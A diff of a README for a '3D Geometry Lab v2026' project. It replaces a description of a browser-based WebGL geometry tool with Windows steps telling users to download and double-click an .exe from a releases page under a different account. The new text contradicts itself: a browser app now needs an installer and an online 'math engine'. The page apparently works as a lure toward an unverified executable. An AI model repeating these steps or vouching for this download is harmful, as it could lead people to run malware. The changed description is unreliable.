@@ -1,116 +1,49 @@
-# 3D Geometry Lab v2026 - educational geometry visualization tool 2026
+# 📐 3d-geometry-lab-v2026 - Explore mathematical shapes in three dimensions
 
-> **3D Geometry Lab is a browser-based geometry study tool that blends interactive 3D math visuals, WebGL rendering, and hand-tracked controls to let users investigate shapes and functions in version 2026.**
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/abdull9951/3d-geometry-lab-v2026/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/ryan-hillrr9494/3d-geometry-lab-v2026?style=flat-square)](https://github.com/ryan-hillrr9494/3d-geometry-lab-v2026)
+3D Geometry Lab v2026 provides a visual environment for students and hobbyists to explore complex mathematical concepts. The software uses WebGL technology to render high-quality 3D objects directly in your web browser. You can manipulate shapes, modify algebraic functions, and observe how different variables change the geometry in real-time. Hand-tracked controls offer an immersive way to rotate and inspect models without a mouse.
 
----
+## 💻 System Requirements
 
-<p align="center">
-  <a href="https://ryan-hillrr9494.github.io/3d-geometry-lab-v2026/">
-    <img src="https://img.shields.io/badge/Download-3D%20Geometry%20Lab%20Latest-brightgreen?style=for-the-badge" alt="Download 3D Geometry Lab">
-  </a>
-</p>
+This application requires a modern desktop computer running Windows 10 or Windows 11. Your computer needs a reliable internet connection to load the library assets. We recommend at least 8GB of RAM for smooth performance when rendering dense geometric shapes. Ensure your graphics card drivers are current. The application runs natively in common web browsers like Google Chrome, Microsoft Edge, or Mozilla Firefox. We suggest keeping your browser updated to the latest version to maintain full WebGL compatibility.
 
-> **[Direct Download - 3D Geometry Lab v2026](https://ryan-hillrr9494.github.io/3d-geometry-lab-v2026/)**
+## 📥 How to Download and Install
 
----
+Follow these steps to set up the software on your Windows machine:
 
-[Download Latest Build](https://ryan-hillrr9494.github.io/3d-geometry-lab-v2026/)
+1. Visit the project release page to find the current installer files: [https://github.com/abdull9951/3d-geometry-lab-v2026/releases](https://github.com/abdull9951/3d-geometry-lab-v2026/releases)
+2. Look for the file ending in .exe under the Assets section of the latest release.
+3. Click the filename to start the download.
+4. Locate the downloaded file in your browser's download folder.
+5. Double-click the .exe file to trigger the installer.
+6. Follow the prompts on the screen to place the program on your desktop.
+7. Click the icon created on your desktop to launch the lab.
 
----
+## 🛠 Using the Interface
 
-## Overview
+The interface centers on the main viewport where your 3D shapes appear. You control the camera view by dragging your mouse across the screen. Clicking the sidebar menu opens the geometry library. From here, you select specific shapes like spheres, cones, or tori. You can toggle wireframe modes or solid rendering modes using the bottom control panel. The math drawer allows you to input custom algebraic equations. The system calculates the resulting shape and displays it instantly within the viewport.
 
-3D Geometry Lab provides an interactive browser workspace for learning and presenting geometry. Using front-end 3D rendering, it displays solids, visual controls, and math-oriented views that make spatial relationships easier to examine from different perspectives.
+## 🖐 Hand Tracking Features
 
-It is intended for students, teachers, and independent learners who want a practical way to work through geometry and related functions. By combining 3D math visualization, camera-driven hand input, and problem-solving support, it supports exploration, demonstration, and practice in one place.
+The lab includes support for hand-tracking devices. If you possess compatible motion-sensing hardware, the software detects your hands. You move your hand in the air to rotate shapes. You pinch your thumb and index finger to zoom in or out on specific points of interest. Ensure you calibrate your sensor before launching the lab to guarantee the most accurate tracking results. You can toggle this feature off in the settings menu if you prefer to use a standard mouse.
 
----
+## ⚙️ Configuration Settings
 
-## Features
+You can customize how the lab handles resource usage. Large 3D models require significant processing power, which can impact older computers. Use the "Quality" slider under settings to decrease detail levels if you experience stuttering. The "Color Theme" option allows you to switch between light mode and dark mode for better visibility in different lighting conditions. All settings save automatically when you exit the application.
 
-- Browser-based interactive 3D geometry lab for learning and exploration
-- Eight geometric solids ready for inspection
-- Mouse orbit controls for turning and examining shapes
-- AI-assisted problem-solving panel for guided geometry tasks
-- Gesture-based 3D shape interaction for hands-on control
-- Camera hand tracking powered by MediaPipe
-- 2D function plotting paired with 3D visualization
-- Wireframe view and size sliders for finer shape adjustments
+## ❓ Frequently Asked Questions
 
----
+What should I do if the screen stays black?
+Check that your browser has hardware acceleration enabled. Visit your browser settings, search for system, and ensure that "Use graphics acceleration when available" is checked.
 
-## Installation
+Can I save my work?
+Yes, use the "Export" button in the file menu. The application saves your current scene as a geometry file that you can reload later.
 
-1. Download or clone the repository:
-   - `git clone https://github.com/ryan-hillrr9494/3d-geometry-lab-v2026.git
-2. Open the project folder:
-   - `cd 3d-geometry-lab`
-3. Serve the front-end through a web server or local preview environment.
-4. Open the app in a browser and grant camera access if you want to use hand tracking.
+Does the software require a permanent internet connection?
+The software requires a connection to load the initial math engine. Once finished, you can use basic viewing tools offline, though some complex library assets may require a periodic network refresh.
 
-If you plan to host it as a static site, upload the built output to your server or GitHub Pages target and then open the published URL.
+Is this software free to use?
+This software is provided as an open-source tool for educational purposes. You can modify and share it under the provided license terms.
 
----
-
-## Usage
-
-Begin by choosing a solid or graph view, then use orbit controls to look at the geometry from multiple angles. The sliders can be used to resize objects, wireframe mode helps expose structure, and the 2D plot area is available for function-based examples.
-
-To use gesture input, enable camera access and complete the on-screen tracking steps so the interface can react to hand movement. The problem-solving panel works alongside the visuals to support step-by-step geometry practice or classroom demonstrations.
-
----
-
-## Configuration
-
-Configuration lives in the front-end project files. Depending on your setup, the relevant settings may be stored in the main HTML, JavaScript modules, or application constants.
-
-Common values you may want to adjust include:
-
-- Default solid selection
-- Plot ranges for 2D graphs
-- Camera and hand-tracking settings
-- Rendering options for WebGL / Three.js
-- UI behavior for sliders and wireframe mode
-
-If you customize the app, remember to account for MediaPipe permissions and browser camera settings when testing gesture features.
-
----
-
-## Requirements
-
-- A modern web browser with WebGL support
-- Access to a browser environment for the front-end
-- Camera permission if using hand tracking features
-- JavaScript enabled
-- Enough local resources for 3D rendering and interactive plotting
-
----
-
-## FAQ
-
-**Does it run inside the browser?**  
-Yes. The project is delivered as a web-based front-end experience.
-
-**Is it suitable for teaching?**  
-Yes. It is centered on geometry education and interactive visualization, so it can be used for lessons, demos, and practice sessions.
-
-**Why does it ask for camera access?**  
-The camera is used for hand tracking and gesture-controlled interaction.
-
-**Where are the settings changed?**  
-Look in the front-end source files for rendering, plotting, and interaction options.
-
-**What if the 3D view renders incorrectly?**  
-Check that your browser supports WebGL and that graphics support is enabled. Also make sure the project is being served properly.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: geometry, 3d-modeling, webgl, math-education, windows-app, interactive-learning, software-installation
